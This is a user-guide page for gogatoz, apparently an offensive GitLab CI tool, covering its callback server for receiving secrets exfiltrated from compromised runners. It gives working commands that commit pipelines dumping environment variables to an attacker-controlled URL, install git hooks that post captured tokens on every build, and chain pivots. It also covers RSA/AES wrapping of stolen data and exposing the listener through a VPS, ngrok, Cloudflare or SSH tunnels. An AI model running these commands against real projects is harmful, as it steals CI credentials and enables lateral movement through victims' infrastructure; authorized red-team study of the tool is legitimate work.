---
title: Callback / Webhook Server
description: How to set up and expose gogatoz's built-in callback server for secrets exfiltration, token harvesting, and pivoting
---

When gogatoz exfiltrates secrets from a CI pipeline, the compromised runner needs somewhere to POST the encrypted payload back to you. That destination is the *callback server* — an HTTP listener that receives, decrypts, and hands off the incoming data so gogatoz can extract tokens and continue.

## Why You Need It

CI runners execute inside GitLab's network and POST outbound to a URL you supply. Three gogatoz capabilities depend on this:

- **`attack --secrets --exfil-method http`** — commits a pipeline that dumps `env` to your URL. If nothing is listening, the pipeline succeeds but the data disappears.
- **`attack --harvest`** — installs git hooks on a runner that POST captured tokens to your URL on every subsequent build.
- **`pivot`** — fully automates the exfil loop; the callback server is central to how it chains depth-to-depth.

The critical constraint: **the URL must be routable from the runner's network**, not just from your laptop.

## Which Commands Use It

| Command | Built-in listener? | Listen address flag | External URL flag |
|---|---|---|---|
| `attack --secrets --exfil-method http` | **No** | — | `--webhook URL` |
| `attack --harvest` | **Yes** (auto-starts) | `--harvest-listen :9443` | `--webhook URL` |
| `pivot` | **Yes** (auto-starts) | `--listen :9443` | `--external-url URL` |

For `attack --secrets`, gogatoz commits the exfil pipeline but does **not** start a listener. You must point `--webhook` at something you're already running (see [Options for `attack --secrets`](#options-for-attack---secrets) below).

## How the Built-in Server Works

When `pivot` or `attack --harvest` starts the callback server, here is what happens end-to-end:

```
CI Runner (GitLab network)
  └─ POST /  ──────────────────────────► gogatoz :9443
        {                                    │
          "payload": "<AES ciphertext>",     │
          "key": "<RSA-encrypted AES key>",  │
          "pipeline_id": "12345"             │
        }                                    ▼
                                   RSA decrypt → AES decrypt
                                   → secrets.json (env vars)
                                   → token extraction
                                   → (pivot) next depth
```

The server listens on a single endpoint — `POST /` — on port `:9443` by default. Each incoming POST is queued internally; gogatoz processes payloads as they arrive.

For `attack --harvest` (git-hook mode), the hook script posts raw `printenv | base64` without the encryption wrapper, so the harvest listener handles that simpler format directly.

## Encryption Scheme

gogatoz uses a two-layer hybrid scheme so exfiltrated data is protected even if TLS is not available on the callback URL.

**Layer 1 — AES-256-CBC (bulk data)**
- The CI pipeline collects `secrets.json` from `printenv | sort`
- Encrypts it with AES-256-CBC using a random passphrase
- Key is derived via PBKDF2-SHA256 (10 000 iterations) — OpenSSL 3.x compatible
- Equivalent to `openssl enc -aes-256-cbc -pbkdf2 -pass pass:$key`

**Layer 2 — RSA-2048 PKCS1v15 (key wrapping)**
- The AES passphrase is encrypted with an RSA public key
- Only the holder of the matching private key can unwrap it
- Equivalent to `openssl rsautl -encrypt -pkcs`

The pipeline POSTs:
```json
{
  "payload": "<base64(AES-CBC ciphertext)>",
  "key":     "<base64(RSA-encrypted AES passphrase)>",
  "pipeline_id": "12345"
}
```

The callback server reverses the process: RSA-decrypt the AES key, then AES-decrypt the payload.

**RSA key lifecycle:**

By default, `pivot` generates a fresh RSA-2048 key pair each session. The public key is embedded in each committed pipeline; the private key stays in memory. When the session ends, the private key is gone — payloads from that session cannot be re-decrypted.

To persist the key across sessions, use `--rsa-key`:

```bash
# Generate once
openssl genrsa -out pivot.key 4096

# Reuse across sessions
gogatoz pivot -t org/project --external-url https://vps:9443 --rsa-key pivot.key
```

## Making the Server Reachable

The callback URL must be routable from the CI runner. Pick the option that fits your engagement.

### Option 1 — VPS / Cloud VM (recommended)

Best for real engagements: static IP, persistent, no dependency on third-party tunnels.

```bash
# Open the port (on your VPS)
ufw allow 9443/tcp

# Run pivot — server starts on :9443 automatically
gogatoz pivot -t org/project --external-url http://YOUR_VPS_IP:9443
```

To use HTTPS, put nginx or Caddy in front with a cert, then proxy to `127.0.0.1:9443`.

### Option 2 — ngrok (quick testing)

No VPS needed. ngrok assigns a public HTTPS URL that tunnels to your local port.

```bash
ngrok http 9443
# Output: Forwarding https://abc123.ngrok.io -> localhost:9443

gogatoz pivot -t org/project --external-url https://abc123.ngrok.io
```

> **Note:** Free ngrok sessions expire and the URL changes each restart. Fine for demos; not suitable for long engagements.

### Option 3 — Cloudflare Tunnel

```bash
cloudflared tunnel --url http://localhost:9443
# Assigns a stable *.trycloudflare.com URL
```

### Option 4 — SSH Remote Port Forward

If you already have SSH access to a server with a routable IP:

```bash
# Bind VPS port 9443 → your local 9443
ssh -R 9443:localhost:9443 user@vps.example.com

gogatoz pivot -t org/project --external-url http://vps.example.com:9443
```

## Options for `attack --secrets`

When using `attack --secrets` without `--harvest`, gogatoz commits the pipeline but starts no listener. Choose one of:

**Use `pivot` as the receiver (full decryption + token extraction)**

Run `pivot` in one terminal; use `attack --secrets` to seed a specific target:
```bash
# Terminal 1 — start the listener
gogatoz pivot -t org/project --external-url https://vps:9443

# Terminal 2 — or just use pivot directly; it attacks and listens in one command
```

**webhook.site / requestbin (verification only)**

Useful to confirm the runner can reach out at all. These services receive the POST but cannot decrypt the payload.

```bash
gogatoz attack --secrets --target org/project \
  --webhook https://webhook.site/your-uuid \
  --exfil-method http
```

**netcat (raw debugging)**

Shows the raw HTTP POST body so you can inspect the encrypted payload structure:
```bash
nc -lkp 9443
```

**Custom receiver**

Implement `POST /` that accepts `{"payload","key","pipeline_id"}` and decrypts with your RSA private key using the scheme described in [Encryption Scheme](#encryption-scheme) above.

## Firewall Checklist

- [ ] TCP inbound open on your chosen port (default `9443`) from `0.0.0.0/0`, or scoped to GitLab's runner egress CIDR if known
- [ ] If runners are in an isolated network, configure a SOCKS5 proxy — see [Networking & Proxy](/user-guide/advanced/networking/)
- [ ] Outbound from the runner to your callback URL is not blocked by egress filtering (test with `curl` from a normal CI job first)

> **Protected variables are not exfiltrated via the callback server.** GitLab only injects protected CI variables into pipelines running on protected branches. The `pivot` command creates unprotected branches, so protected variables are out of scope. Use `attack --secrets --project-vars` to enumerate them separately (requires maintainer access).

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `receive timeout` in `pivot` | Runner can't reach `--external-url` | Check firewall; verify with `curl -X POST http://YOUR_URL` from a standard CI job |
| Payload arrives but decryption fails | RSA key mismatch | Re-run using the `--rsa-key` that matches the public key embedded in the committed pipeline |
| No POST arrives at all | Wrong host/port in `--webhook` or `--external-url` | Confirm listener is up: `nc -lkp 9443`; send test: `curl -X POST http://localhost:9443` |
| `harvest` mode: callbacks received, no tokens extracted | No GitLab token in that job's environment | Expected — not every runner job carries a useful credential. Expand target scope. |
| ngrok URL changes between runs | Free ngrok session restarted | Use `--rsa-key` to preserve the RSA key so old pipeline payloads can still be decrypted after reconnect |

## Related Pages

- [Pivot Command](/user-guide/command-reference/pivot/) — full automation of the exfil loop
- [Attack Command](/user-guide/command-reference/attack/) — `--secrets`, `--harvest`, and payload options
- [Networking & Proxy](/user-guide/advanced/networking/) — SOCKS5 proxy for isolated runner networks
- [Lateral Movement use case](/user-guide/use-cases/lateral-movement/) — end-to-end walkthrough
